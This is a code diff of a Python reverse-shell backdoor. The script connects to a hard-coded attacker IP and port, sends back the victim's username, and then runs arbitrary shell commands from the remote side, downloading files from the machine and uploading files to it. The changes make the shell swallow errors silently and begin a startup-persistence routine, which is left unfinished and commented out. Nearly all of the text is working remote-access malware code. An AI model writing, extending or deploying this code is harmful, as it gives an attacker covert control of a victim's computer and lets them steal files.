@@ -8,20 +8,20 @@
 """
 
 import os
+import sys
+import shutil
+import platform
 import json
 import socket
 import base64 
 import subprocess
 
-""" 
-* Function Name:  get_user()
-* Input:          None
-* Output:         user (string): The compromised user. 
-* Logic:          The function runs the 'whoami' subprocess call to retrieve the username of the compromised user. 
-* Example Call:   user = get_user()
 """
-def get_user():
-    return subprocess.check_output("whoami", shell=True).decode('utf-8')
+def execute_on_startup():
+    try:
+        if(platform.system() == "Windows"):
+            evil_file_loc = 
+"""
 
 """ 
 * Function Name:  establish_connection()
@@ -35,7 +35,7 @@ def establish_connection(ip, port):
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connection.connect((ip, port))
 
-    user = get_user()
+    user = execute_system_command("whoami")
     success_message = "IP: {} | User: {}".format(ip, user)
     send_data(connection, success_message)
 
@@ -80,7 +80,7 @@ def send_data(connection, data):
 """
 def execute_system_command(command):
     try:
-        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
     except:
         return "INVALID command."
 
@@ -140,35 +140,44 @@ def write_file(path, data):
 """
 def communicate(connection):
     while True:
-        command = receive_data(connection)
+        try:
+            command = receive_data(connection)
 
-        if(command[0] == "quit"):
-            break
+            if(command[0] == "quit"):
+                break
 
-        elif((command[0] == "cd") and (len(command) > 1)):
-            result = change_working_directory(command[1])
-            send_data(connection, result)
+            elif((command[0] == "cd") and (len(command) > 1)):
+                result = change_working_directory(command[1])
+                send_data(connection, result)
 
-        elif(command[0] == "download"):
-            file_data = read_file(command[1])
-            send_data(connection, file_data)
+            elif(command[0] == "download"):
+                file_data = read_file(command[1])
+                send_data(connection, file_data)
 
-        elif(command[0] == "upload"):
-            path = command[2] if(len(command) > 3) else command[1]
-            data = command[3] if(len(command) > 3) else command[2]
-            result = write_file(path, data)
-            send_data(connection, result)
+            elif(command[0] == "upload"):
+                path = command[2] if(len(command) > 3) else command[1]
+                data = command[3] if(len(command) > 3) else command[2]
+                result = write_file(path, data)
+                send_data(connection, result)
 
-        else:
-            result = execute_system_command(command)
-            send_data(connection, result)
+            else:
+                result = execute_system_command(command)
+                send_data(connection, result)
+
+        except:
+            continue
     
     connection.close()
 
 
 if __name__ == "__main__":
-    ATTACKER_IP = "192.168.1.11"
-    PORT = 2000
+    try:
+        ATTACKER_IP = "192.168.1.11"
+        PORT = 2000
 
-    connection = establish_connection(ATTACKER_IP, PORT)
-    communicate(connection)
+        #execute_on_startup()
+        connection = establish_connection(ATTACKER_IP, PORT)
+        communicate(connection)
+
+    except:
+        pass
